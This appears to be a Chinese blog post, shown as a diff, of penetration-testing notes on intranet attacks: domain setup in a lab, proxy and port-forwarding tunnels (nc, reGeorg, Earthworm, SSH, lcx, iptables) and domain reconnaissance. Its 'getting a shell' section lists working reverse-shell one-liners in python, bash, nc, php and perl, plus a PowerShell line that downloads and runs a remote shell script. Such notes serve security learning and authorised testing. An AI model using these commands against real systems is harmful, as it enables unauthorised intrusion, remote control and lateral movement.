+<p>2.DMZ（Demilitarized Zone，边界网络，隔离区，安全级别中等）：作为内网中安全系统和非安全系统之间的缓冲区，用于对外提供服务，一般可以放置一些必须公开的服务器设施</p>
+<p>3.外网（Internet，安全级别最低）</p>
+<h2 id="DMZ区域"><a href="#DMZ区域" class="headerlink" title="DMZ区域"></a>DMZ区域</h2><p>DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。<br>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。<br>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。</p>
+<ul>
+<li>  内网可以访问外网：内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。</li>
+<li>  内网可以访问DMZ：此策略使内网用户可以使用或者管理DMZ中的服务器。</li>
+<li>  外网不能访问内网：这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果要访问，就要通过VPN方式来进行。</li>
+<li>  外网可以访问DMZ：DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</li>
+<li>  DMZ不能访问内网：如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。　</li>
+<li>  DMZ不能访问外网：此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。</li>
+</ul>
+<h2 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h2><p>组（Group）是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限，管理员在日常工作中不必要去为单个用户帐号设置自己独特的访问权限，而是将用户帐号加入到相对应的安全组中。</p>
+<h3 id="1-域本地组"><a href="#1-域本地组" class="headerlink" title="1.域本地组"></a>1.域本地组</h3><p>可以从域林中添加用户账号，权限只限于本域资源的访问。</p>
+<h3 id="2-全局组"><a href="#2-全局组" class="headerlink" title="2.全局组"></a>2.全局组</h3><p>可以从本域中添加用户账号，权限可以访问整个域林的资源。</p>
+<h3 id="3-通用组"><a href="#3-通用组" class="headerlink" title="3.通用组"></a>3.通用组</h3><p>可从整个域林添加成员，权限可访问整个域林的资源。</p>
+<h3 id="4-A-G-DL-P策略"><a href="#4-A-G-DL-P策略" class="headerlink" title="4.A-G-DL-P策略"></a>4.A-G-DL-P策略</h3><p>A-G-DL-P策略 （A:表示用户账户、G:表示全局组、U:表示通用组、DL:表示域本地组、P:表示资源权限）</p>
+<h1 id="2-域搭建"><a href="#2-域搭建" class="headerlink" title="2.域搭建"></a>2.域搭建</h1><blockquote>
+<p>  DC: win2008 ，密码Admin123<br>  DM: win2003<br>  DM: winxp</p>
+</blockquote>
+<p>DC2008：</p>
+<p>网络配置</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174256681.png" alt="image-20220316174256681"></p>
+<p>添加服务器角色：</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174530574.png" alt="image-20220316174530574"></p>
+<p>配置域服务(在administrator用户下。。)：</p>
+<p>dos下：<code>dcpromo</code></p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316174748182.png" alt="image-20220316174748182"></p>
+<p>提示错误的话，管理员cmd<code>net user administrator /passwordreq:yes</code></p>
+<p>设置林根域：</p>
+<p>林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316182106728.png" alt="image-20220316182106728"></p>
+<p>域数据存放的地址：</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316182303660.png" alt="image-20220316182303660"></p>
+<p>密码还是设置为Admin123!</p>
+<p>接下来就是配置win2003和xp，都和08差不多</p>
+<p>配置的dns要设置为主域控的ip：192.168.188.100</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316183849046.png" alt="image-20220316183849046"></p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220316184043460.png" alt="image-20220316184043460"></p>
+<h1 id="3-端口转发-amp-边界代理"><a href="#3-端口转发-amp-边界代理" class="headerlink" title="3.端口转发&amp;边界代理"></a>3.端口转发&amp;边界代理</h1><p>先说下正向代理和反向代理：<img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606872766_5fc6eebe0e0d42db8c48c.png!small" alt="img"></p>
+<p>正向代理：<code>Lhost--&gt;proxy--&gt;Rhost</code></p>
+<p>反向代理：<code>Lhost&lt;---&gt;proxy&lt;---&gt;firewall&lt;---&gt;Rhost</code>，一般情况下，防火墙肯定不能让外网机器随便访问地访问内网机器，所以就提出反向代理。</p>
+<p>Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透。</p>
+<p>代理的本质：socks协议，位于会话层（应用层）</p>
+<p>Socks介于传输层与表示层之间，使用TCP协议传输数据，因而不提供如传递ICMP信息之类的网络层相关服务。</p>
+<p>目前有两个版本：SOCKS4和SOCKS5</p>
+<p>SOCKS4支持TELNET、FTPHTTP等TCP协议；</p>
+<p>SOCKS5支持TCP与UDP，并支持安全认证方案。</p>
+<p>Ps: Socks不支持ICMP，不能使用ping命令</p>
+<p>使用nc演示</p>
+<blockquote>
+<p>  主机A：192.168.153.138</p>
+<p>  主机B：192.168.153.140</p>
+</blockquote>
+<p>正向：</p>
+<p>A机：<code>nc -l -p 5555 -t -e cmd.exe</code>，-t是通过telnet模式执行 cmd.exe 程序，可以省略</p>
+<p>B机：<code>nc -nvv 192.168.153.138 5555</code>，</p>
+<p>反向：</p>
+<p>B机：监听 <code>nc-lp 5555</code></p>
+<p>在A机反弹：<code>nc -t -e cmd 192.168.153.140 5555</code></p>
+<h2 id="reGeorg-Proxychains"><a href="#reGeorg-Proxychains" class="headerlink" title="reGeorg+Proxychains"></a>reGeorg+Proxychains</h2><p>主要是把内网服务器的端口通过http/https隧道转发到本机。</p>
+<p>上传reGeorg的tunnel.jsp到web主机A</p>
+<p>主机B：<code>python reGeorgSocksProxy.py -p 1080 -u http://192.168.153.137/tunnel.jsp</code></p>
+<p>使用设置proxychains的代理端口，进行访问，一般配合nmap和metasploit进行后续内网渗透。</p>
+<p>Ps：socks4版本协议不支持udp和icmp协议，所以使用nmap要加上-sT -Pn即使用tcp协议且不使用icmp协议。</p>
+<h2 id="Earthworm-Proxychains"><a href="#Earthworm-Proxychains" class="headerlink" title="Earthworm+Proxychains"></a>Earthworm+Proxychains</h2><h3 id="反弹socks5服务器"><a href="#反弹socks5服务器" class="headerlink" title="反弹socks5服务器"></a>反弹socks5服务器</h3><p>当目标网络边界不存在公网IP，通过反弹方式创建socks代理。</p>
+<p>先在一台具有公网 ip 的主机A上运行以下命令</p>
+<p><code>./ew_for_linux64 -s rcsocks -l 1080 -e 8888</code></p>
+<p>意思是在我们公网VPS上添加一个转接隧道，把1080端口收到的代理请求转交给8888端口</p>
+<p>在目标主机B上启动SOCKS5服务 并反弹到公网主机的8888端口</p>
+<p><code>ew_for_Win.exe -s rssocks -d 192.168.153.129(VPS) -e 8888</code></p>
+<p>本地主机（192.168.153.129）然后通过添加公网192.168.153.129:1080这个代理,来访问内网机器（192.168.153.129）</p>
+<h3 id="二级网络环境（有公网IP）"><a href="#二级网络环境（有公网IP）" class="headerlink" title="二级网络环境（有公网IP）"></a>二级网络环境（有公网IP）</h3><p>假设我们获得了右侧A主机和B主机的控制权限，A主机配有2块网卡，一块10.129.72.168连通外网，一块192.168.153.140只能连接内网B主机，无法访问内网其它资源。B主机可以访问内网资源，但无法访问外网。</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606876288_5fc6fc80d5cb1db233661.png!small" alt="img"></p>
+<p>先上传ew到B主机，利用ssocksd方式启动8888端口的SOCKS代理，命令如下<code>ew_for_Win.exe -s ssocksd -l 8888</code></p>
+<p>A主机执行：<code>ew_for_Win.exe -s lcx_tran -l 1080 -f 192.168.153.138 -g 8888</code>(将1080端口收到的代理请求转交给B主机（192.168.153.138）的8888端口)</p>
+<p>MyPc就可以通过A的外网代理10.129.72.168:1080访问B。</p>
+<h3 id="二级网络（无公网IP）"><a href="#二级网络（无公网IP）" class="headerlink" title="二级网络（无公网IP）"></a>二级网络（无公网IP）</h3><p>假设我们获得了右侧A主机和B主机的控制权限，A主机（NAT）没有公网IP，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/1606876319_5fc6fc9f5e6fcab88b21d.png!small" alt="img"></p>
+<ol>
+<li><p> 在公网vps（45.xxx.xxx.72）添加转接隧道，将10800端口收到的代理请求转交给8888端口<code>./ew_for_linux64 -s lcx_listen -l 10800 -e 8888</code></p>
+</li>
+<li><p>B主机（192.168.153.138）主机正向开启9999端口</p>
+<p> <code>./ew_for_Win.exe -s ssocksd -l 9999</code></p>
+</li>
+<li><p>A主机利用lcx_slave方式，将公网VPS的888端口和B主机的999端口连接起来</p>
+<p> <code>./ew_for_Win.exe -s lcx_slave -d 45.xxx.xxx.72 -e 8888 -f 192.168.153.138 -g 9999</code></p>
+</li>
+</ol>
+<p>现在MyPC可通过访问45.xxx.xxx.72:10800来使用192.168.153.138主机提供的socks5代理，代理成功，vps会有rssocks cmd_socket OK!提示</p>
+<h2 id="SSH隧道代理转发"><a href="#SSH隧道代理转发" class="headerlink" title="SSH隧道代理转发"></a>SSH隧道代理转发</h2><p>sh有三个强大的端口转发命令，分别是本地转发、远程转发、动态转发。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ssh -qTfnN -D port remotehost</span><br><span class="line"></span><br><span class="line">参数详解：</span><br><span class="line">-C 允许压缩数据</span><br><span class="line">-q 安静模式</span><br><span class="line">-T不占用 shell</span><br><span class="line">-f 后台运行，并推荐加上 -n 参数</span><br><span class="line">-N不执行远程命令</span><br><span class="line">-g允许远端主机连接本地转发的端口</span><br><span class="line">-n把 stdin 重定向到 /dev/null (防止从 stdin 读取数据)</span><br><span class="line">-L port:host :hostport 正向代理</span><br><span class="line">//将本地机(客户机)的某个端口转发到远端指定机器的指定端口</span><br><span class="line">-R port:host :hostport 反向代理</span><br><span class="line">//将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口</span><br><span class="line">-D port socks5代理</span><br><span class="line">//指定一个本地机器 <span class="string">&quot;动态&quot;</span> 应用程序端口转发</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssh本地转发"><a href="#ssh本地转发" class="headerlink" title="ssh本地转发"></a>ssh本地转发</h3><p>本地转发（local forwarding）指的是，SSH 服务器作为中介的跳板机，建立本地计算机与特定目标网站之间的加密连接。本地转发是在本地计算机的 SSH 客户端建立的转发规则。</p>
+<p>它会指定一个本地端口（local-port），所有发向那个端口的请求，都会转发到 SSH 跳板机（tunnel-host），然后 SSH 跳板机作为中介，将收到的请求发到目标服务器（target-host）的目标端口（target-port）。</p>
+<p>远程管理服务器上的mysql，mysql不能直接root用户远程登陆。这时候就可以通过本地转发，通过ssh将服务器的3306端口转发到本地1234端口实现以root用户远程登陆mysql。</p>
+<p><code>$ ssh -L local-port:target-host:target-port tunnel-host</code></p>
+<p><code>ssh -CfNg -L 1234:127.0.0.1:3306 root@45.XX.XX.X21</code></p>
+<p>另一例子：</p>
+<p>假定host1是本地主机，host2是远程主机。由于种种原因，这两台主机之间无法连通。但是，另外还有一台host3，可以同时连通前面两台主机。因此，很自然的想法就是，通过host3，将host1连上host2。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在host1上：</span></span><br><span class="line">ssh -L 2121:host2:21 host3</span><br><span class="line"><span class="comment">#这样一来，我们只要连接host1的2121端口，就等于连上了host2的21端口。</span></span><br><span class="line">ftp localhost:2121</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="ssh远程转发"><a href="#ssh远程转发" class="headerlink" title="ssh远程转发"></a>ssh远程转发</h3><p>内网的服务器，外网不能直接访问，使用远程转发，将内网的服务器端口转发到外网端口。这时候访问外网的端口，就可以直接访问到了内网的端口。</p>
+<p>将远程主机(服务器)的某个端口转发到本地端指定机器的指定端口</p>
+<p>既然”本地端口转发”是指绑定本地端口的转发，那么”远程端口转发”当然是指绑定远程端口的转发。</p>
+<p>host1与host2之间无法连通，必须借助host3转发。但是，特殊情况出现了，host3是一台内网机器，它可以连接外网的host1，但是反过来就不行，外网的host1连不上内网的host3。这时，”本地端口转发”就不能用了，怎么办？</p>
+<p>解决办法是，既然host3可以连host1，那么就从host3上建立与host1的SSH连接，然后在host1上使用这条连接就可以了。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#host3上</span></span><br><span class="line">ssh -R 2121:host2:21 host1</span><br><span class="line"><span class="comment">#就是让host1监听它自己的2121端口，然后将所有数据经由host3，转发到host2的21端口。由于对于host3来说，host1是远程主机，所以这种情况就被称为&quot;远程端口绑定&quot;。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#host1上：</span></span><br><span class="line">ftp localhost:2121</span><br></pre></td></tr></table></figure>
+
+<h3 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h3><p>无论是本地端口转发还是远程端口转发，都是将某固定主机及其端口映射到本地或远程转发端口上，例如将host2:80映射到host1:2222。也就是说，本地或远程转发端口和目标端口所代表的应用层协议是一对一的关系，2222端口必须对应的是http的80端口，使用浏览器向host1:2222端口发起http请求当然没问题，但是使用ssh工具向host1:2222发起连接将会被拒绝，因为host2上http服务只能解析http请求，不能解析ssh连接请求。</p>
+<p>ssh支持动态端口转发，由ssh来判断发起请求的工具使用的是什么应用层协议，然后根据判断出的协议结果决定目标端口。<br>以下图为例进行说明，host1处在办公内网，能和host3互相通信，但它无法直接和互联网和host2通信，而host3则可以和host2以及互联网通信。</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/733013-20170706233246425-1384840260.png" alt="img"></p>
+<p>要让host1访问互联网，又能和host2的22端口即ssh服务通信，显然在host1上仅设置一个本地端口转发是不够的，虽然可以设置多个本地转发端口分别映射不同的端口，但这显然比较笨重和麻烦。使用动态端口转发即可。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在host1上</span></span><br><span class="line">ssh -Nfg -D 2222 host3</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>尝试几个常用的</p>
+<p>win：lcx</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">监听1234端口,转发数据到2333端口</span><br><span class="line">本地:lcx.exe -listen 1234 2333</span><br><span class="line"></span><br><span class="line">将目标的3389转发到本地的1234端口</span><br><span class="line">远程:lcx.exe -slave ip 1234 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p>netsh<br>只支持tcp协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">添加转发规则</span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389</span><br><span class="line">此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389</span><br><span class="line"></span><br><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=9090</span><br><span class="line"></span><br><span class="line">查看现有规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">xp需要安装ipv6</span><br><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure>
+
+<p>linux :</p>
+<p>portmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">监听1234端口,转发数据到2333端口</span><br><span class="line">本地:./portmap -m 2 -p1 1234 -p2 2333</span><br><span class="line"></span><br><span class="line">将目标的3389转发到本地的1234端口</span><br><span class="line">./portmap -m 1 -p1 3389 -h2 ip -p2 1234</span><br></pre></td></tr></table></figure>
+
+<p>iptables</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、编辑配置文件/etc/sysctl.conf的net.ipv4.ip_forward = 1</span><br><span class="line"></span><br><span class="line">2、关闭服务</span><br><span class="line">service iptables stop</span><br><span class="line"></span><br><span class="line">3、配置规则</span><br><span class="line">需要访问的内网地址：192.168.206.101</span><br><span class="line">内网边界web服务器：192.168.206.129</span><br><span class="line">iptables -t nat -A PREROUTING --dst 192.168.206.129 -p tcp --dport 3389 -j DNAT --to-destination 192.168.206.101:3389</span><br><span class="line"></span><br><span class="line">iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129</span><br><span class="line"></span><br><span class="line">4、保存&amp;&amp;重启服务</span><br><span class="line">service iptables save &amp;&amp; service iptables start</span><br></pre></td></tr></table></figure>
+
+<h2 id="socket代理"><a href="#socket代理" class="headerlink" title="socket代理"></a>socket代理</h2><p>Windows：xsocks，进行代理后，在windows下推荐使用Proxifier进行socket连接，规则自己定义</p>
+<p>linux：</p>
+<p>进行代理后，推荐使用proxychains进行socket连接</p>
+<p>kali下的配置文件：<br>/etc/proxychains.conf<br>添加一条：socks5     127.0.0.1 8888</p>
+<p>然后在命令前加proxychains就进行了代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl 192.168.111111</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="4-获取shell"><a href="#4-获取shell" class="headerlink" title="4.获取shell"></a>4.获取shell</h1><h2 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h2><p>常用一句话反弹shell：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.1.130&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/172.16.1.130/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">nc 172.16.1.130 4444 -t -e /bin/bash</span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;172.16.1.130&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;172.16.1.130&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh \-i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);Invoke-PowerShellTcp</span><br><span class="line">\-Reverse -IPAddress 172.16.1.130 -port 4444</span><br></pre></td></tr></table></figure>
+
+<h2 id="ICMP隧道反弹shell"><a href="#ICMP隧道反弹shell" class="headerlink" title="ICMP隧道反弹shell"></a>ICMP隧道反弹shell</h2><p><a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">工具GitHub</a></p>
+<p>有时候防火墙可能对tcp进行来处理，然而对imcp并没有做限制的时候，可以使用icmp弹shell。</p>
+<p>直接跑run.sh，就OK，在靶机下运行生成的命令。</p>
+<h1 id="5-信息收集"><a href="#5-信息收集" class="headerlink" title="5.信息收集"></a>5.信息收集</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="查看当前网卡和IP信息："><a href="#查看当前网卡和IP信息：" class="headerlink" title="查看当前网卡和IP信息："></a>查看当前网卡和IP信息：</h3><p>可以看到通过查看网卡信息可以判断出当前机器是否在域内，以及是否是⼀台域机器</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317175559094.png" alt="image-20220317175559094"></p>
+<h3 id="查看操作系统信息"><a href="#查看操作系统信息" class="headerlink" title="查看操作系统信息"></a>查看操作系统信息</h3><p><code>systeminfo</code></p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317175921095.png" alt="image-20220317175921095"></p>
+<p>通过查看系统的详细信息我们可以判断出当前主机是一台属于域内的机器，因为在工作组环境的机器只会显示WORKGROUP，而域则会显示域地址。</p>
+<h3 id="查看当前登陆域及域用户"><a href="#查看当前登陆域及域用户" class="headerlink" title="查看当前登陆域及域用户"></a>查看当前登陆域及域用户</h3><p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317180028774.png" alt="image-20220317180028774"></p>
+<h3 id="查看域内时间"><a href="#查看域内时间" class="headerlink" title="查看域内时间"></a>查看域内时间</h3><p><code>net time /domain</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">运行 net time /domain 该命令后，一般会有如下三种情况:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>存在域，但当前用户不是域用户，提示说明权限不够</span><br><span class="line">  <span class="attr">C</span>:\Users&gt;bypass&gt;net time /domain</span><br><span class="line">  发生系统错误 <span class="number">5</span></span><br><span class="line">  拒绝访问。</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>存在域，并且当前用户是域用户</span><br><span class="line">   <span class="attr">C</span>:\Users\Administrator&gt;net time /domain</span><br><span class="line">   \\dc.test.com 的当前时间是 <span class="number">2020</span>/<span class="number">10</span>/<span class="number">23</span> <span class="number">21</span>:<span class="number">18</span>:<span class="number">37</span></span><br><span class="line"></span><br><span class="line">   命令成功完成。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>当前网络环境为工作组，不存在域</span><br><span class="line">   <span class="attr">C</span>:\Users\Administrator&gt;net time /domain</span><br><span class="line">   找不到域 WORKGROUP 的域控制器。</span><br></pre></td></tr></table></figure>
+
+<p>查找域</p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317182421455.png" alt="image-20220317182421455"></p>
+<h3 id="查找域内所有计算机"><a href="#查找域内所有计算机" class="headerlink" title="查找域内所有计算机"></a>查找域内所有计算机</h3><p><code>net view /domain GHOST</code></p>
+<h3 id="查询域内所有用户组列表-默认13个"><a href="#查询域内所有用户组列表-默认13个" class="headerlink" title="查询域内所有用户组列表(默认13个)"></a>查询域内所有用户组列表(默认13个)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>
+
+<h3 id="查询所有域成员计算机列表"><a href="#查询所有域成员计算机列表" class="headerlink" title="查询所有域成员计算机列表"></a>查询所有域成员计算机列表</h3><p><code>net group &quot;domain computer&quot; /domain</code></p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317182701533.png" alt="image-20220317182701533"></p>
+<h3 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h3><p><code>nltest /dclist:ghost</code></p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183428519.png" alt="image-20220317183428519"></p>
+<h3 id="查看域控制器的主机名"><a href="#查看域控制器的主机名" class="headerlink" title="查看域控制器的主机名"></a>查看域控制器的主机名</h3><p><code>Nslookup -type=SRV _ldap._tcp</code></p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183743360.png" alt="image-20220317183743360"></p>
+<h3 id="查看域控制器"><a href="#查看域控制器" class="headerlink" title="查看域控制器"></a>查看域控制器</h3><p><code>net group &quot;domain controllers&quot; /doamin</code></p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317183912489.png" alt="image-20220317183912489"></p>
+<h3 id="查询域管理员列表"><a href="#查询域管理员列表" class="headerlink" title="查询域管理员列表"></a>查询域管理员列表</h3><p><code>net group &quot;domain admins&quot; /domain</code></p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317184120741.png" alt="image-20220317184120741"></p>
+<h3 id="获取所有域用户列表"><a href="#获取所有域用户列表" class="headerlink" title="获取所有域用户列表"></a>获取所有域用户列表</h3><p><code>net group &quot;domain users&quot; /domain</code></p>
+<p><img src="/2022/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F&%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20220317184213265.png" alt="image-20220317184213265"></p>
